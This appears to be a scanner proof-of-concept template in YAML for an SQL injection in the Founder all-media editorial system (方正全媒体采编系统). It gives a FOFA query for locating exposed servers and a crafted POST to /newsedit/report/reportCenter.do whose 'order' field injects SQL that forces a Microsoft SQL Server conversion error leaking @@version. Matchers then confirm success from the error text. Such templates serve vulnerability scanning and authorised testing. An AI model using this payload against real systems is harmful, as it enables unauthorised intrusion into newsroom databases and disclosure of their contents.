id: poc-yaml-founder-newsedit-reportcenter-do-sqli
info:
  name: 方正全媒体采编系统 reportCenter.do SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 方正全媒体采编系统
  fofa: app="FOUNDER-全媒体采编系统"
requests:
- method: POST
  path: /newsedit/report/reportCenter.do
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: type=paperLayoutList&paperDate=2023-1-1&token=1&pageNo=1&pageSize=1&order=x'
    THEN 5 ELSE 5 END) AS status from (select '1x' as SYS_CURRENTSTATUS) d) tmp where
    cast(@@version as int)=5-- a
  expression: 'status_code == 200 &&

    contains(body,"在将 nvarchar 值") &&

    contains(body,"报道中心") &&

    contains(body,"xml") &&

    contains(body,"Microsoft SQL Server") &&

    contains(body,"转换成数据类型 int 时失败")

    '
variables: {}
transport: http
